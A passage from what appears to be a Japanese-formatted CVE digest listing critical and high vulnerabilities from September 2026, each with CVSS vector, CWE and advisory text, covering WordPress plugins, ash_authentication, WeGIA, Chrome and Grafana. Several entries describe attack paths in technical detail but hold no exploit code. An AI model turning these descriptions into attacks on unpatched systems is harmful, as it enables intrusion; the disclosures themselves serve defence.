| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:Y/R:U/V:C/RE:H/U:X` |
| Weaknesses | `CWE-130` |
| Published | 2026-09-18T14:17:14.870 |

Improper handling of length parameter inconsistency vulnerability in ABB Freelance Controller DCP, ABB Freelance Controller AC700, ABB Freelance Controller AC800, and ABB Freelance Controller AC900.

This issue affects Freelance Controller DCP: through 2013, 2013 SP1, 2016, 2016 SP1, 2019, and 2019 SP1; Freelance Controller AC700: through 2013, 2013 SP1, 2016, 2016 SP1, 2019, and 2019 SP1; Freelance Controller AC800: through 2013, 2013 SP1, 2016, 2016 SP1, 2019, and 2019 SP1; Freelance Controller AC900: through 2013, 2013 SP1, 2016, 2016 SP1, 2019, and 2019 SP1.

### CVE-2026-93393

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-787` |
| Published | 2026-09-17T21:17:56.163 |

A heap-based buffer overflow exists in the TLS transport layer of the MongoDB C Driver when built with the Windows platform TLS backend. A remote endpoint that the client connects to, or an attacker able to impersonate or redirect the client's connection, can cause the driver to write attacker-supplied data outside the bounds of a heap allocation while processing incoming encrypted traffic. No authentication or user interaction is required, because the affected processing occurs before any application-level authentication completes. Successful exploitation may lead to memory corruption in the client process, disclosure of adjacent heap memory, or termination of the process.

### CVE-2026-92943

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-297` |
| Published | 2026-09-17T20:18:59.333 |

Improper validation of certificate with host mismatch in the MQTT client TLS connection layer in AWS IoT Device SDK for Python 1.5.3 through 1.6.0 on Python 3.7 and later might allow an adversary-in-the-middle actor to impersonate the AWS IoT Core endpoint, read device telemetry, and inject arbitrary MQTT messages that the device processes as authentic, via a certificate issued for an unrelated hostname by a certificate authority present in the device trust store.



To remediate this issue, users should upgrade to version 1.6.1.

### CVE-2026-76834

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-502` |
| Published | 2026-09-17T16:17:42.270 |

b2evolution CMS versions 6.7.8 through 7.2.5 contain an incomplete fix for CVE-2016-8901 where the serialized-array object check in param_check_serialized_array() fails to reject payloads with negative integer array keys. Unauthenticated attackers can submit crafted serialized PHP objects via POST requests to htsrv/call_plugin.php that bypass validation and reach unserialize(), instantiating arbitrary PHP objects with attacker-chosen properties that may enable code execution if suitable POP gadget chains exist.

### CVE-2026-79752

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-17T15:16:51.673 |

CakePHP is a rapid development framework for PHP. Prior to 4.5.12, 4.6.5, 5.1.9, 5.2.14, and 5.3.7, FunctionsBuilder::cast, FunctionsBuilder::extract, FunctionsBuilder::datePart, and FunctionsBuilder::dateAdd in src/Database/FunctionsBuilder.php accept user-controlled dataType, part, or unit values and incorporate them into generated SQL as unescaped structural fragments. An application that passes untrusted input to these parameters can permit SQL injection with confidentiality, integrity, and availability impact according to the database connection's privileges. This issue is fixed in versions 4.5.12, 4.6.5, 5.1.9, 5.2.14, and 5.3.7.

### CVE-2026-84738

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2026-09-18T06:16:39.307 |

The AF Companion  WordPress plugin before 2.2.0 does not validate the type of files uploaded through one of its import features, allowing users with a low-privileged store-management role to upload arbitrary files, including PHP ones, leading to Remote Code Execution.

### CVE-2026-76949

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-290` |
| Published | 2026-09-17T22:17:03.883 |

Authentication Bypass by Spoofing vulnerability in team-alembic ash_authentication allows an attacker who can plant a remember-me cookie in a victim's browser to replace that victim's authenticated session with one for the attacker's own account.

AshAuthentication.Plug.Helpers.sign_in_using_remember_me/3 skips re-authenticating an already-signed-in visitor by checking the session for "<subject_name>_token", but store_in_session/2 writes that key only when require_token_presence_for_authentication? is enabled and otherwise writes the bare subject name. At the default setting the guard therefore reads a key that is never written, its already-signed-in branch is unreachable, and the remember-me sign-in runs on every request through the per-request browser pipeline plug. A planted remember-me cookie is consequently honoured even for a visitor holding a live authenticated session, so whatever the victim enters afterwards lands in data the attacker controls. The read path in authenticate_resource_from_session/4 selects the key correctly, so the guard and the reader disagree about which key holds the session.

This issue affects ash_authentication: from 4.10.0 before 4.15.0 and from 5.0.0-rc.0 before 5.0.0-rc.14.

### CVE-2026-54767

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H` |
| Weaknesses | `CWE-306;CWE-798` |
| Published | 2026-09-17T22:17:03.470 |

WeGIA is a web manager for charitable institutions. Prior to 3.8.5, web/html/socio/sistema/controller/deletar_socios.php exposes an unauthenticated GET endpoint whose chave parameter is checked only against a hardcoded chave_correta value embedded in the public source repository. A remote attacker who obtains that value can reach the endpoint's TRUNCATE TABLE operations for the endereco, pessoafisica, pessoajuridica, and socio tables without an administrative session or application authorization, permanently destroying member and contributor records. The attack requires the affected tables to exist and the web process database account to possess truncation privileges. This issue is fixed in version 3.8.5.

### CVE-2026-54670

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-22;CWE-306` |
| Published | 2026-09-17T22:17:02.983 |

WeGIA is a web manager for charitable institutions. Prior to 3.8.5, the contribution request dispatcher in web/html/contribuicao/controller/control.php accepts attacker-controlled nomeClasse and metodo values without a complete controller and method allowlist, exempts sensitive ContribuicaoLogController operations from authentication, and constructs a controller include path without canonical directory containment. An unauthenticated remote attacker can invoke getContribuicoesLogJSON, sincronizarStatus, registrarFaturas, and other sensitive methods to disclose contribution and donation records or trigger financial workflow operations. A traversal-shaped nomeClasse value can also cause require_once to include an accessible PHP or configuration file outside the intended controller directory, exposing source code, credentials, or other sensitive local data. This issue is fixed in version 3.8.5.

### CVE-2026-91039

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-290` |
| Published | 2026-09-17T16:18:28.700 |

Authentication Bypass by Spoofing vulnerability in team-alembic ash_authentication allows an attacker who operates one identity-provider connection of a dynamic_oidc strategy to be signed in as a local user established through a different connection.

The strategy is meant to keep each connection in its own identity namespace by writing every UserIdentity row's strategy field as "<name>/<connection_id>", but that namespacing never takes effect. __connection_id__ is populated only on the ephemeral runtime struct built per request in dynamic_oidc/plug.ex, and DynamicOidc.IdentityChange.change/3 re-fetches the strategy from the compile-time DSL through Info.strategy_for_action, yielding the persisted struct whose __connection_id__ is its defstruct default of nil. OAuth2.identity_strategy_name/1 therefore falls back to the bare strategy name for both the identity write and the reads in oauth2/user_resolver.ex and oauth2/sign_in_preparation.ex. Since the identity resource's unique key is (uid, strategy), one row exists per sub across every connection, and the identity-match branch runs before any email check. Neither strategy handles iss, so nothing else distinguishes the issuers: OpenID Connect Core section 5.7 makes sub unique only within an issuer, so two connections numbering subjects independently share one subject space.

This issue affects ash_authentication: from 5.0.0-rc.10 before 5.0.0-rc.14.

### CVE-2026-88952

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-287` |
| Published | 2026-09-17T15:16:56.290 |

Improper Authentication vulnerability in team-alembic AshAuthentication allows an attacker to be signed in as another user by linking an OAuth2 identity to an account that is not theirs.

AshAuthentication.Strategy.OAuth2.UserResolver.resolve/3 matches an existing account using the register action's upsert_identity keys, then gates linking the incoming provider identity to it on email_trusted?/2, which reads only the provider's email_verified boolean and never compares the provider's email value with the matched account's email. That gate assumes the account was matched by its email field, so under any other upsert_identity it is vacuous and an attacker presenting their own verified email is attached to, and issued a session for, an account matched on some other attribute. The same unguarded gate applies in OAuth2.SignInPreparation on the registration_enabled? false path, where the account is matched by the sign-in action's read filter instead. The upsert also rewrites the matched account's email to the attacker's address, so later account recovery reaches the attacker rather than the owner.

This issue affects ash_authentication: from 4.14.0 before 4.15.0 and from 5.0.0-rc.10 before 5.0.0-rc.14.

### CVE-2026-63472

| 項目 | 値 |
|------|-----|
| CVSS | `9.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-287` |
| Published | 2026-09-17T15:16:49.743 |

Vendure is an open-source headless commerce platform. Prior to 3.7.0, ExternalAuthenticationService.createCustomerAndUser in packages/core/src/service/helpers/external-authentication/external-authentication.service.ts selects an existing customer user by emailAddress and attaches a newly presented ExternalAuthenticationMethod without requiring verified to be true. In deployments with a custom external AuthenticationStrategy that forwards an email whose ownership the provider has not verified, an attacker can authenticate with a victim's email and bind the attacker's external identity to the victim's existing account. This can expose orders, addresses, and personal information and permit account changes or orders as the victim. Native-only email and password deployments and external strategies that always require provider-verified email ownership are unaffected, and new-account creation for an unused email remains permitted. This issue is fixed in version 3.7.0.

### CVE-2026-77903

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-290` |
| Published | 2026-09-17T23:18:44.993 |

Authentication bypass by spoofing in Microsoft Dataverse allows an unauthorized attacker to elevate privileges over a network.

### CVE-2026-45143

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-17T21:17:12.600 |

Chamilo LMS is an open-source learning management system. From 2.0.0 through at least 2.1.0, Chamilo LMS stores private Message.content without server-side sanitization and renders it as HTML in assets/vue/views/message/MessageShow.vue and public/main/template/default/message/view_message.html.twig. An authenticated low-privilege user, including a student, can directly address crafted message content to an administrator because the message creation flow permits a sender to select another user as the recipient. The content executes in the recipient's browser when the recipient opens the routine inbox or message view, without requiring a link click, and can expose session credentials or permit actions as the administrator. This vulnerability is fixed in 2.0.1.

### CVE-2026-47252

| 項目 | 値 |
|------|-----|
| CVSS | `9.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2026-09-17T19:16:48.083 |

Anyquery is an SQL query engine built on top of SQLite. Prior to 0.4.5, authenticated users with INSERT or UPDATE access to affected macOS virtual tables can execute operating-system commands because the Chrome plugin and equivalent Brave, Edge, and Safari variants interpolate a SQL-controlled URL into AppleScript or JXA source passed to osascript. In plugins/chrome/tabs.go, tabsTable.Insert() passes the URL through fmt.Sprintf(newTabScript, url), and tabsTable.Update() uses fmt.Sprintf(setURLScript, pk, url). A URL containing quote and newline characters can break out of the intended string or property record and append script statements, resulting in arbitrary command execution with the privileges of the anyquery process on the macOS host. This issue is fixed in version 0.4.5.

## 🟠 High（CVSS 7.0〜9.0 未満）

### CVE-2026-15579

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-787` |
| Published | 2026-09-18T10:17:04.537 |

An out-of-bounds write vulnerability exists in some of the Ethernet switches because of improper validation of the username field length during Web login processing. This may allow a remote attacker to submit a specially crafted overly long input, triggering a buffer overflow that can cause the authentication process to crash and result in a Denial of Service (DoS) attack.

### CVE-2026-13673

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-732` |
| Published | 2026-09-18T09:16:38.997 |

An incorrect permission assignment for critical resource vulnerability in LDAP API in Synology DiskStation Manager (DSM) before 7.2.1-69057-12, 7.2.2-72806-9, 7.3.2-86009-4 and 7.4-90075 allows remote authenticated users to read or write arbitrary files and conduct denial-of-service attacks.

### CVE-2026-12954

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-20` |
| Published | 2026-09-18T08:16:59.100 |

The Mapster WP Maps plugin for WordPress is vulnerable to Arbitrary User Meta Write in all versions up to, and including, 1.23.0 via the `my_profile_update()` function. This is due to the function performing no nonce verification, no capability check, and no allowlist validation on the meta key supplied via the `acf-photo-gallery-groups` POST parameter before passing both the meta key and its corresponding value directly to `update_user_meta()`. This makes it possible for authenticated attackers, with Subscriber-level access and above, to update arbitrary user meta values, though privilege escalation is not possible.

### CVE-2026-12384

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-639` |
| Published | 2026-09-18T08:16:58.813 |

Authorization bypass through User-Controlled key vulnerability in TECHIN2B TECHIN2B Application allows Privilege Abuse.

This issue affects TECHIN2B Application: from V1.0.7676.13 through 18092026.
NOTE: The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2026-88825

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-18T06:16:41.157 |

The iGMS Direct Booking WordPress plugin before 2.0 does not authorise or escape its widget appearance settings, allowing unauthenticated users to store arbitrary web scripts that execute in the context of an administrator viewing the iGMS Direct Booking WordPress plugin before 2.0 settings, and in the browser of any visitor to a page displaying the booking widget.

### CVE-2026-85127

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-18T06:16:40.093 |

The VikBooking Hotel Booking Engine & PMS WordPress plugin before 1.8.15 does not restrict the type of files unauthenticated visitors may attach to its live chat, nor sanitize their contents, allowing them to store active content which is executed in the context of an administrator viewing the conversation.

### CVE-2026-85122

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-18T06:16:39.880 |

The Easy Form Builder by WhiteStudio  WordPress plugin before 4.2.0 does not validate a submitted value against the stored configuration for some of its form types, allowing unauthenticated users to store arbitrary content which is then rendered unescaped in an admin page, leading to Stored XSS.

### CVE-2026-17086

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2026-09-18T04:17:28.900 |

The ShortPixel Image Optimizer – Optimize Images, Convert WebP & AVIF plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 6.5.5 via deserialization of untrusted input . This makes it possible for authenticated attackers, with author-level access and above, to inject a PHP Object. No known POP chain is present in the vulnerable software, which means this vulnerability has no impact unless another plugin or theme containing a POP chain is installed on the site. If a POP chain is present via an additional plugin or theme installed on the target system, it may allow the attacker to perform actions like delete arbitrary files, retrieve sensitive data, or execute code depending on the POP chain present.

### CVE-2026-54671

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-639;CWE-862` |
| Published | 2026-09-17T22:17:03.150 |

WeGIA is a web manager for charitable institutions. Prior to 3.8.5, WeGIA maps InternoControle to an empty resource array in web/controle/control.php, and verificarPermissao in web/dao/MiddlewareDAO.php treats that empty array as unconditional access for every authenticated user. The methods in web/controle/InternoControle.php, including listarUm, alterar, and excluir, accept user-controlled id or idInterno values without verifying ownership, allowing a low-privileged user to read, modify, or delete another person's records and expose personal, identity, address, medical, and family information. The advisory notes that a self-referencing load bug can crash this controller in the reported revision, but the empty-resource authorization pattern and affected methods remain the vulnerability under review. This issue is fixed in version 3.8.5.

### CVE-2026-54612

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-22;CWE-94` |
| Published | 2026-09-17T22:17:01.377 |

Vvveb is a powerful and easy to use CMS with page builder to build websites, blogs or ecommerce stores. From 1.0.0 until 1.0.8.5, saveGlobalElements() in admin/controller/editor/global-trait.php concatenates the attacker-controlled file portion of data-v-save-global to the active theme directory before loadHTMLFile() and file_put_contents() operate on it. An authenticated user with the default Editor role and editor/* permission can submit crafted HTML to module=editor/editor&action=save and traverse to an existing writable PHP file outside the theme directory. If the target is web-accessible, editor-controlled PHP content executes in the web server context; a shipped public/vadmin/index.php entrypoint can be used as an execution trampoline rather than requiring a test-only file. This can permit persistent webshell placement and compromise application confidentiality, integrity, and availability. This issue is fixed in version 1.0.8.5.

### CVE-2026-54519

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-862` |
| Published | 2026-09-17T22:17:00.930 |

AI Agent Automation is a modular AI agent workflow automation platform with schedulers, tools, and observability. Prior to 0.9.1, backend/src/controllers/memory.controller.js authenticates requests but listMemories, deleteMemory, and clearAgentMemory use a caller-supplied agentId or memory _id without verifying through the related Agent that the record belongs to req.user. An authenticated attacker who knows or obtains another user's identifiers can read victim AgentMemory content, including conversation history, agent context, task data, embeddings, and metadata, delete an individual victim memory, or clear all memory belonging to a victim agent. This breaks tenant isolation and causes unauthorized disclosure and data loss. This issue is fixed in version 0.9.1.

### CVE-2026-93382

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-416` |
| Published | 2026-09-17T21:17:55.530 |

Use after free in PDFium in Google Chrome prior to 153.0.8010.52 allowed a remote attacker to execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)

### CVE-2026-93381

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-122` |
| Published | 2026-09-17T21:17:55.430 |

Buffer overflow in PDFium in Google Chrome on on Windows prior to 153.0.8010.52 allowed a remote attacker leveraging social engineering to potentially execute arbitrary code inside the sandbox via a crafted PDF file. (Chromium security severity: High)

### CVE-2026-93377

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-843` |
| Published | 2026-09-17T21:17:55.000 |

Type confusion in V8 in Google Chrome prior to 153.0.8010.52 allowed a remote attacker leveraging social engineering to execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)

### CVE-2026-54916

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-427;CWE-829` |
| Published | 2026-09-17T21:17:17.790 |

NetBox Device Type Library is a collection of community-sourced device type definitions for import into NetBox. The absence of tests/init.py and the lack of --import-mode=importlib cause pytest prepend import mode to place the tests directory at the front of sys.path during collection. An unauthenticated contributor can add a module such as tests/git.py that shadows GitPython when tests/definitions_test.py executes from git import Git, Repo, or add tests/conftest.py for automatic collection-time execution. Python imports and runs the pull-request module before any test function, allowing arbitrary code execution on the GitHub Actions runner, test-result tampering, and access to tokens or network resources exposed to the workflow. This module-shadowing path is independent of the earlier pickle deserialization flaw and the separately tracked NETBOX_DT_LIBRARY_URL issue. This vulnerability is fixed by commit b0d9a3dadd0a0a9d3c93b0b2777559fd4bad1037.

### CVE-2026-15815

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-22;CWE-59;CWE-94` |
| Published | 2026-09-17T21:17:11.210 |

Grafana OSS and Grafana Enterprise did not safely resolve symbolic links when
extracting plugin archives. A crafted plugin archive can chain relative symbolic link
entries to escape the plugin installation directory, writing arbitrary files and an
executable backend binary outside that directory. The dropped executable runs with the
privileges of the Grafana server process, resulting in remote code execution.

Plugin archives are extracted before their signature is verified, so a valid plugin
signature does not prevent the write. An operator can therefore be affected by
installing a plugin that appears legitimate, as well as by installing a plugin from an
arbitrary archive using grafana-cli, the GF_INSTALL_PLUGINS environment variable, or
preinstall configuration.

Grafana Enterprise is affected because it includes the same plugin extraction code as
Grafana OSS.

### CVE-2026-54504

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-306;CWE-668` |
| Published | 2026-09-17T19:16:50.517 |

MCP Documentation Server is a local-first document management and semantic search server for AI coding agents. From 1.13.0 until 1.13.1, the automatically started Web UI in src/server.ts calls startWebServer in src/web-server.ts with START_WEB_UI enabled by default and WEB_PORT set to 3080. startWebServer uses app.listen(PORT) without a host, which binds the unauthenticated document-management API to all interfaces rather than localhost. A network-reachable client can invoke GET /api/documents, GET /api/documents/:id, POST /api/documents, POST /api/search-all, DELETE /api/documents/:id, and GET /api/config without credentials to enumerate and read documents, search the corpus, insert or delete documents, and tamper with the MCP assistant's knowledge base. The service must be reachable from the attacker's LAN, VM network, container bridge, VPN, or another routed network, and the issue does not provide remote code execution. This issue is fixed in 1.13.1.

### CVE-2026-54239

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-345;CWE-639` |
| Published | 2026-09-17T19:16:50.047 |

Faust.js is a headless WordPress toolkit. Prior to 1.8.11, the FaustWP WordPress plugin authenticates only the ciphertext in its token envelope and excludes the 16-byte initialization vector from the HMAC in WPE\FaustWP\Auth\encrypt() and WPE\FaustWP\Auth\decrypt() in plugins/faustwp/includes/auth/functions.php. A logged-in non-administrator who obtains an authorization code from GET /generate can modify the unauthenticated initialization vector so that CBC decryption changes the token type and user identifier while the HMAC remains valid. This can produce an access token for an Administrator and permit full WordPress REST API access, administrator-account creation, plugin installation, and arbitrary code execution. This issue is fixed in repository version 1.8.11.

### CVE-2026-28326

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-321` |
| Published | 2026-09-17T17:16:39.960 |

SolarWinds Access Rights Manager was reported to be affected by an unauthenticated remote code execution vulnerability. The issue stems from a hardcoded static key.

### CVE-2026-77614

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-384` |
| Published | 2026-09-17T15:16:51.503 |

Opencast is a free, open-source platform to support the management of educational audio and video content. Prior to versions 19.7 and 20.2, the default security configuration in etc/security/mh_default_org.xml accepts a client-selected JSESSIONID from the ;jsessionid= URL path parameter and does not replace it when the victim logs in. An unauthenticated attacker can send a crafted link to a victim whose browser has no active Opencast session cookie, wait for the victim to authenticate, and then reuse the known identifier as the victim's authenticated session. This can expose the victim's data and actions and can produce full administrative account takeover when the victim is an administrator. This issue is fixed in versions 19.7 and 20.2.

### CVE-2026-93599

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-191` |
| Published | 2026-09-18T14:19:11.410 |

rustls-webpki through 0.103.12 (and 0.104.0-alpha releases before 0.104.0-alpha.7) contains a reachable panic in bit_string_flags() in src/der.rs. The input guard fails to reject a named-bit BIT STRING whose content is exactly [0x00] (zero padding bits and no data bytes), so raw_bits.len() - 1 underflows on the empty slice and the subsequent index operation panics (subtract-with-overflow in debug, index-out-of-bounds in release). The condition is reachable through the public API BorrowedCertRevocationList::from_der() when a CRL contains an issuingDistributionPoint extension with such an onlySomeReasons value. Exploitation requires an application that explicitly opts in to CRL revocation checking by passing RevocationOptions to verify_for_usage() and that parses CRL bytes obtained from a source the attacker can influence; the default rustls configuration, which does not use RevocationOptions, is unaffected. A crafted CRL causes a denial of service via the panic. Fixed in 0.103.13 and 0.104.0-alpha.7.

### CVE-2026-93592

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-129` |
| Published | 2026-09-18T14:19:10.267 |

vLLM versions before 0.28.0 fail to validate the lower bound of token IDs in the /v1/embeddings and /pooling endpoints, allowing unauthenticated attackers to crash the engine by submitting negative token IDs. A single request with a negative token ID triggers a CUDA device-side assertion that poisons the GPU context, causing all subsequent requests to fail until the process restarts.

### CVE-2026-93468

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-23` |
| Published | 2026-09-18T03:16:33.920 |

The OAKlouds developed by HGiga has an Arbitrary File Read vulnerability. Unauthenticated remote attackers can exploit Relative Path Traversal to read arbitrary system files.

### CVE-2026-79954

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
